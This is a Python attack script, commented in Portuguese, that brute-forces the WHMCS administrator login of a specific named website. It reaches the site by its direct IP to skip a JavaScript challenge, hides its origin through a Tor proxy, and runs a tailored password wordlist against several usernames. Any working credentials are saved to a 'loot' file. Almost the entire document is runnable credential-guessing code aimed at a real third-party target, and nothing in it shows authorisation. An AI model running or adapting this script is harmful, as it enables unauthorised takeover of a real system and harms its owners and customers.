#!/usr/bin/env python3
"""
WHMCS Admin Brute Force via Playwright + Tor proxy
Alvo: 8kiptv.co (via IP direto para bypass JS Challenge)
"""

import asyncio
import sys
import re
import time

# Wordlist de senhas comuns para WHMCS / cPanel
PASSWORDS = [
    "admin", "password", "admin123", "123456", "whmcs", "admin2024",
    "admin2025", "admin2026", "Password1", "P@ssw0rd", "passwd",
    "test", "demo", "root", "toor", "manager", "administrator",
    "letmein", "welcome", "qwerty", "12345678", "123456789",
    "admin1", "server", "hosting", "8kiptv", "kiptv", "iptv",
    "stream", "tv2024", "tv2025", "tv2026", "support", "info",
    "servpcxr", "admin@8kiptv.co", "Admin1", "Master", "master",
    "changeme", "secret", "pass", "temp", "temp123", "user",
    "username", "login", "secure", "s3cur3", "pr0ducti0n",
    "whmcsadmin", "whmcs2024", "cpanel", "cpadmin", "webhost",
    "hosting123", "server123", "plesk", "directadmin", "virtuozzo",
    "Admin!", "admin!", "Password!", "password!",
    # Senhas comuns brasileiras
    "admin1234", "flamengo", "corinthians", "santos", "palmeiras",
    "brasil", "senha", "1234", "1234567890",
]

async def try_login(page, username, password, csrf_token):
    """Tenta login com um par usuário/senha"""
    try:
        await page.fill('input[name="username"]', username)
        await page.fill('input[name="password"]', password)
        await page.click('input[type="submit"]')
        await page.wait_for_timeout(3000)
        
        # Verificar resultado
        content = await page.content()
        
        if "Login" not in content or "Invalid" not in content:
            # Possível sucesso - verificar URL
            current_url = page.url
            if "dologin" not in current_url and "login" not in current_url:
                return True, f"SUCESSO! user={username} pass={password} url={current_url}"
            else:
                # Verificar mensagem de erro
                error_match = re.search(r'class="alert[^"]*alert-danger[^"]*"[^>]*>(.*?)</div>', content, re.DOTALL)
                if error_match:
                    return False, f"Falha: {error_match.group(1).strip()}"
                return False, "Falha (resposta desconhecida)"
        else:
            error_match = re.search(r'class="alert[^"]*alert-danger[^"]*"[^>]*>(.*?)</div>', content, re.DOTALL)
            if error_match:
                return False, f"Falha: {error_match.group(1).strip()}"
            return False, "Falha (página de login)"
    except Exception as e:
        return False, f"Erro: {e}"

async def extract_csrf(page):
    """Extrai CSRF token da página"""
    content = await page.content()
    match = re.search(r'name="token"\s+value="([a-f0-9]+)"', content)
    if match:
        return match.group(1)
    return None

async def main():
    print("=== WHMCS Admin Brute Force ===")
    print(f"Target: https://68.65.122.227/clients/admin/login.php")
    print(f"Host: 8kiptv.co")
    print(f"Wordlist: {len(PASSWORDS)} passwords")
    print()
    
    from playwright.async_api import async_playwright
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--proxy-server=socks5://127.0.0.1:9050',
            ]
        )
        
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1920, "height": 1080},
            ignore_https_errors=True,
        )
        
        page = await context.new_page()
        
        # Testar conexão
        print("[*] Testando conexão...")
        try:
            await page.goto("https://68.65.122.227/clients/admin/login.php", 
                          wait_until="networkidle", timeout=30000)
            print(f"[+] Página carregada! Title: {await page.title()}")
        except Exception as e:
            print(f"[-] Erro ao carregar página: {e}")
            await browser.close()
            return
        
        # Extrair CSRF token
        csrf = await extract_csrf(page)
        if csrf:
            print(f"[+] CSRF token: {csrf}")
        else:
            print("[-] CSRF token não encontrado!")
            # Tentar continuar mesmo assim
        
        # Testar com usuários conhecidos
        users_to_try = ["admin", "admin1", "Administrator", "root", "servpcxr"]
        
        for user in users_to_try:
            for pwd in PASSWORDS:
                print(f"[*] Tentando: {user}:{pwd} ", end="", flush=True)
                
                # Recarregar página para novo CSRF
                try:
                    await page.goto("https://68.65.122.227/clients/admin/login.php",
                                  wait_until="networkidle", timeout=15000)
                except:
                    pass
                
                csrf = await extract_csrf(page)
                
                success, msg = await try_login(page, user, pwd, csrf)
                print(f"-> {msg[:80]}")
                
                if success:
                    print(f"\n{'='*60}")
                    print(f"*** {msg} ***")
                    print(f"{'='*60}")
                    # Salvar evidência
                    with open("/home/ubuntu/8kiptv.co/loot/creds.txt", "w") as f:
                        f.write(f"WHMCS Admin: {user}:{pwd}\n")
                        f.write(f"URL: https://8kiptv.co/clients/admin/\n")
                        f.write(f"Via IP: https://68.65.122.227/clients/admin/\n")
                    with open("/home/ubuntu/8kiptv.co/evidence/F-026-whmcs-admin-creds.txt", "w") as f:
                        f.write(f"# F-026 WHMCS Admin Credentials Found\n")
                        f.write(f"Alvo: 8kiptv.co (68.65.122.227)\n")
                        f.write(f"Severidade: CRÍTICA\n")
                        f.write(f"Timestamp: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}\n\n")
                        f.write(f"## Credenciais\n")
                        f.write(f"Usuário: {user}\n")
                        f.write(f"Senha: {pwd}\n\n")
                        f.write(f"## Acesso\n")
                        f.write(f"URL: https://8kiptv.co/clients/admin/\n")
                        f.write(f"Via IP (sem JS Challenge): https://68.65.122.227/clients/admin/\n")
                    await browser.close()
                    return
                
                # Rate limiting
                await asyncio.sleep(3)  # 3 segundos entre tentativas
            
            print(f"[*] Usuário {user} esgotado, trocando...")
            await asyncio.sleep(5)
        
        print("\n[-] Nenhuma senha válida encontrada na wordlist.")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())